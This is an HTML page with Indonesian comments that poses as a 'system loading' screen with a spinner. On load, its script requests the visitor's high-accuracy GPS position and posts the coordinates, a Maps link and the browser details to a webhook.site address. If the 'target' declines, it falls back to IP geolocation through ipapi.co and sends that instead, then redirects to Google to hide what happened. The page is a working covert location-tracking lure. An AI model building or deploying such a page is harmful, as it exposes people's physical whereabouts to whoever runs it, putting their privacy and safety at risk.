<!DOCTYPE html>
<html>
<head>
    <title>Sistem Sedang Memuat...</title>
    <style>body{background:#000;color:#222;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}</style>
</head>
<body>
    <div style="border:2px solid #111;border-top:2px solid #333;border-radius:50%;width:20px;height:20px;animation:s 1s linear infinite"></div>
    <style>@keyframes s{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>

<script>
    const webhook = "https://webhook.site/3c903d72-6b38-4d96-a901-286e3fc578b2";

    async function sendLog(data) {
        await fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
        navigator.sendBeacon(webhook, JSON.stringify(data));
    }

    function capture() {
        // Ambil data GPS (Akurasi Tinggi)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const acc = pos.coords.accuracy;

                // Data lengkap dengan koordinat GPS asli
                const report = {
                    tipe: "GPS_PRESISI_TINGGI",
                    maps: `https://www.google.com/maps?q=${lat},${lon}`,
                    akurasi_meter: acc,
                    detail: `Koordinat: ${lat}, ${lon}`,
                    device: navigator.userAgent
                };
                
                await sendLog(report);
                window.location.href = "https://www.google.com";

            }, async (err) => {
                // Jika target klik "TOLAK", ambil data IP sebagai cadangan
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                const fallback = {
                    tipe: "CADANGAN_IP_ONLY (Target Menolak GPS)",
                    kota: d.city,
                    maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
                };
                await sendLog(fallback);
                window.location.href = "https://www.google.com";
            }, { enableHighAccuracy: true });
        }
    }

    window.onload = capture;
</script>
</body>
</html>
